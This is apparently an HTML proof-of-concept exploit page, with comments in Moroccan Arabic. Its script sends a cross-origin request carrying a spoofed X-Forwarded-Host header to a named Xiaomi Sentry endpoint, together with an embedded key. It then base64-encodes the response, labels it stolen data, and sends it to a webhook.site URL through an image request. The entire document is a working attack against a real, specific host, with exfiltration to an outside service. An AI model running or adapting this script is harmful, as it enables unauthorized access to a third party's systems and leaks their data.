<!DOCTYPE html>
<html>
<head><title>Exploit PoC</title></head>
<body>
    <h2>Testing CORS/Host Injection... Check Webhook!</h2>
    <script>
        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
        var target = "https://alisgp-sentry.d.xiaomi.net/api/4/envelope/?sentry_key=3af74c2d5d8b493f93abc405cb83371a";

        var xhr = new XMLHttpRequest();
        xhr.open("POST", target, true);
        
        // هاد Headers هما اللي كيخليو الـ Bypass يخدم
        xhr.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
        xhr.setRequestHeader("X-Forwarded-Host", "alisgp-sentry.pt.xiaomi.com");

        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                // أول ما تجي الداتا، صيفطها للـ Webhook بـ GET Request بسيطة
                var stolenData = btoa(xhr.responseText);
                var leak = new Image();
                leak.src = webhook + "?exfiltrated=" + stolenData;
                console.log("Data sent to Webhook!");
            }
        };

        var body = '{"sent_at":"' + new Date().toISOString() + '"}\n{"type":"session"}\n{"init":true}';
        xhr.send(body);
    </script>
</body>
</html>
